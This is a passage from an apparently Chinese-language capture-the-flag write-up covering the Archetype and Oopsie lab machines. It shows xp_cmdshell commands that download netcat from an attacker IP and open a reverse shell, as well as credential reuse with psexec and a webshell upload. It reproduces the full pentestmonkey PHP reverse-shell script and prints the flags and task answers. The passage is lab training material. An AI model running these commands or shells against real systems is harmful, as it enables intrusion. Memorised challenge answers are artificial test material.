，用于上传到靶机</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">python3 -m http.<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>然后再执行</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">EXEC xp_cmdshell &#x27;curl -o C:\Users\sql_svc\nc.exe http://10.10.16.31:<span class="hljs-number">8000</span>/nc64.exe&#x27;<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c2a56c6e6ffa3068.png"></p><p>太不容易了，终于传上去了</p><p>然后执行，反弹 shell </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">EXEC xp_cmdshell &#x27;C:\Users\sql_svc\nc 10.10.16.31 <span class="hljs-number">1234</span> -e powershell&#x27;<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure><p>监听得到</p><p><img src="https://img.dkdun.cn/v1/2025/12/8d1eb2bd3bb6bb97.png"></p><p>进入 <code>sql_svc</code> 用户得到 userflag</p><p><img src="https://img.dkdun.cn/v1/2025/12/70e4a24ff74565c8.png"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Submit <span class="hljs-keyword">user</span> <span class="hljs-title">flag</span><br>:<span class="hljs-number">3</span>e7b102e78218e935bf3f4951fec21a3<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-6"><a href="#Submit-Flag-6" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>根据之前找到的用户和密码</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">administrator:MEGACORP_4dm1n!!<br></code></pre></td></tr></table></figure><p>用 <code>psexec</code> 进行连接</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> psexec.py ARCHETYPE/administrator@<span class="hljs-number">10.129.50.161</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/55892af842e8dc23.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:b91ccec3305e98240082d4474b848528<br></code></pre></td></tr></table></figure><h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><h3 id="Task-1-6"><a href="#Task-1-6" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">With</span> what kind <span class="hljs-keyword">of</span> tool can intercept web traffic?<br>:proxy<br></code></pre></td></tr></table></figure><h3 id="Task-2-6"><a href="#Task-2-6" class="headerlink" title="Task 2"></a>Task 2</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# nmap -sS -sC -Pn <span class="hljs-number">10.129.191.100</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2025-03-04</span> <span class="hljs-number">21</span>:<span class="hljs-number">43</span> CST<br>Nmap scan report for <span class="hljs-number">10.129.191.100</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">49</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br>| ssh-hostkey:<br>|   <span class="hljs-number">2048</span> <span class="hljs-number">61:e4:3f:d4:1e:e2:b2:f1</span>:<span class="hljs-number">0d:3c:ed:36:28:36:67:c7</span> (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">24:1d:a4:17:d4:e3:2a:9c</span>:<span class="hljs-number">90:5c:30:58:8f:60:77:8d</span> (ECDSA)<br>|_  <span class="hljs-number">256 78:03</span>:<span class="hljs-number">0e:b4:a1:af:e5:c2:f9:8d</span>:<span class="hljs-number">29</span>:<span class="hljs-number">05</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">29</span>:c9:f2 (ED25519)<br><span class="hljs-number">80</span>/tcp open  http<br></code></pre></td></tr></table></figure><p>开了 22 和 80，访问 80</p><p><img src="https://img.dkdun.cn/v1/2025/12/bc6c06a64e4fb429.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-type">path</span> <span class="hljs-keyword">to</span> the directory <span class="hljs-keyword">on</span> the webserver that <span class="hljs-keyword">returns</span> a <span class="hljs-keyword">login</span> page?<br>:/cdn-cgi/<span class="hljs-keyword">login</span><br></code></pre></td></tr></table></figure><h3 id="Task-3-6"><a href="#Task-3-6" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What can be modified <span class="hljs-keyword">in</span> Firefox <span class="hljs-built_in">to</span> <span class="hljs-built_in">get</span> access <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> upload page?<br>:cookie<br></code></pre></td></tr></table></figure><h3 id="Task-4-6"><a href="#Task-4-6" class="headerlink" title="Task 4"></a>Task 4</h3><p>id&#x3D;1 时为 admin</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.129.191.100</span>/cdn-cgi/login/admin.php?content=accounts&amp;id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c877c650ccae7bc1.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">access</span> ID <span class="hljs-keyword">of</span> the <span class="hljs-keyword">admin</span> <span class="hljs-keyword">user</span>?<br>:<span class="hljs-number">34322</span><br></code></pre></td></tr></table></figure><h3 id="Task-5-6"><a href="#Task-5-6" class="headerlink" title="Task 5"></a>Task 5</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">On uploading a <span class="hljs-built_in">file</span>, what directory <span class="hljs-keyword">does</span> <span class="hljs-keyword">that</span> <span class="hljs-built_in">file</span> appear <span class="hljs-keyword">in</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> server?<br>:/uploads<br></code></pre></td></tr></table></figure><h3 id="Task-6-6"><a href="#Task-6-6" class="headerlink" title="Task 6"></a>Task 6</h3><p><img src="https://img.dkdun.cn/v1/2025/12/bb602b9c50217e2d.png"></p><p>在 uploads 上传一个一句话木马，蚁剑连接，<code>/var/www/html/cdn-cgi/login/</code> 路径下找到</p><p>db.php 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;robert&#x27;</span>,<span class="hljs-string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="hljs-string">&#x27;garage&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">that</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> password <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> shared <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> robert user?<br>:db.php<br></code></pre></td></tr></table></figure><h3 id="Task-7-6"><a href="#Task-7-6" class="headerlink" title="Task 7"></a>Task 7</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What executible <span class="hljs-keyword">is</span> run <span class="hljs-keyword">with</span> the <span class="hljs-keyword">option</span> &quot;-group bugtracker&quot; <span class="hljs-keyword">to</span> identify <span class="hljs-keyword">all</span> files <span class="hljs-keyword">owned</span> <span class="hljs-keyword">by</span> the bugtracker <span class="hljs-keyword">group</span>?<br>:find<br></code></pre></td></tr></table></figure><h3 id="Task-8-4"><a href="#Task-8-4" class="headerlink" title="Task 8"></a>Task 8</h3><p>传上去的文件几分钟就被删了，有定时任务，弹个 shell，用 kali 自带的 webshell，<code>/usr/share/webshells/php</code> 下的 <code>php-reverse-shell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="hljs-comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="hljs-comment">// for any actions performed using this tool.  The author accepts no liability</span><br><span class="hljs-comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span><br><span class="hljs-comment">// do not use this tool.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// In all other respects the GPL version 2 applies:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This program is free software; you can redistribute it and/or modify</span><br><span class="hljs-comment">// it under the terms of the GNU General Public License version 2 as</span><br><span class="hljs-comment">// published by the Free Software Foundation.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This program is distributed in the hope that it will be useful,</span><br><span class="hljs-comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="hljs-comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="hljs-comment">// GNU General Public License for more details.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// You should have received a copy of the GNU General Public License along</span><br><span class="hljs-comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span><br><span class="hljs-comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="hljs-comment">// for any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="hljs-comment">// you, then do not use this tool.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="hljs-comment">// me at pentestmonkey@pentestmonkey.net</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Description</span><br><span class="hljs-comment">// -----------</span><br><span class="hljs-comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="hljs-comment">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Limitations</span><br><span class="hljs-comment">// -----------</span><br><span class="hljs-comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="hljs-comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span><br><span class="hljs-comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Usage</span><br><span class="hljs-comment">// -----</span><br><span class="hljs-comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span><br><br><span class="hljs-title function_ invoke__">set_time_limit</span> (<span class="hljs-number">0</span>);<br><span class="hljs-variable">$VERSION</span> = <span class="hljs-string">&quot;1.0&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;  <span class="hljs-comment">// CHANGE THIS</span><br><span class="hljs-variable">$port</span> = <span class="hljs-number">1234</span>;       <span class="hljs-comment">// CHANGE THIS</span><br><span class="hljs-variable">$chunk_size</span> = <span class="hljs-number">1400</span>;<br><span class="hljs-variable">$write_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$error_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;<br><span class="hljs-variable">$daemon</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$debug</span> = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Daemonise ourself if possible to avoid zombies later</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="hljs-comment">// our php process and avoid zombies.  Worth a try...</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;pcntl_fork&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// Fork and have the parent process exit</span><br>        <span class="hljs-variable">$pid</span> = <span class="hljs-title function_ invoke__">pcntl_fork</span>();<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t fork&quot;</span>);<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Parent exits</span><br>        &#125;<br><br>        <span class="hljs-comment">// Make the current process a session leader</span><br>        <span class="hljs-comment">// Will only succeed if we forked</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">posix_setsid</span>() == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Error: Can&#x27;t setsid()&quot;</span>);<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$daemon</span> = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// Change to a safe directory</span><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><br><span class="hljs-comment">// Remove any umask we inherited</span><br><span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Do the reverse shell...</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">// Open reverse connection</span><br><span class="hljs-variable">$sock</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123;<br>        <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&quot;</span>);<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// Spawn shell process</span><br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<br>   <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  <span class="hljs-comment">// stdin is a pipe that the child will read from</span><br>   <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  <span class="hljs-comment">// stdout is a pipe that the child will write to</span><br>   <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)   <span class="hljs-comment">// stderr is a pipe that the child will write to</span><br>);<br><br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// Set everything to non-blocking</span><br><span class="hljs-comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span><br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Successfully opened reverse shell to <span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>&quot;</span>);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// Check for end of TCP connection</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$sock</span>)) &#123;<br>                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell connection terminated&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Check for end of STDOUT</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell process terminated&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Wait until a command is end down $sock, or some</span><br>        <span class="hljs-comment">// command output is available on STDOUT or STDERR</span><br>        <span class="hljs-variable">$read_a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br>        <span class="hljs-variable">$num_changed_sockets</span> = <span class="hljs-title function_ invoke__">stream_select</span>(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// If we can read from the TCP socket, send</span><br>        <span class="hljs-comment">// data to process&#x27;s STDIN</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK READ&quot;</span>);<br>                <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK: <span class="hljs-subst">$input</span>&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$input</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// If we can read from the process&#x27;s STDOUT</span><br>        <span class="hljs-comment">// send data down tcp connection</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT READ&quot;</span>);<br>                <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$chunk_size</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT: <span class="hljs-subst">$input</span>&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// If we can read from the process&#x27;s STDERR</span><br>        <span class="hljs-comment">// send data down tcp connection</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR READ&quot;</span>);<br>                <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$chunk_size</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR: <span class="hljs-subst">$input</span>&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$sock</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><br><span class="hljs-comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span><br><span class="hljs-comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printit</span> (<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123;<br>                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$string</span>\n&quot;</span>;<br>        &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>把 IP 和 Port 改一下然后传上去，监听</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ su<br>su: must be <span class="hljs-built_in">run</span> <span class="hljs-keyword">from</span> a terminal<br></code></pre></td></tr></table></figure><p>必须要交互 shell</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -<span class="hljs-built_in">type</span> f -group bugtracker 2&gt;/dev/null<br><span class="hljs-built_in">ls</span> -al 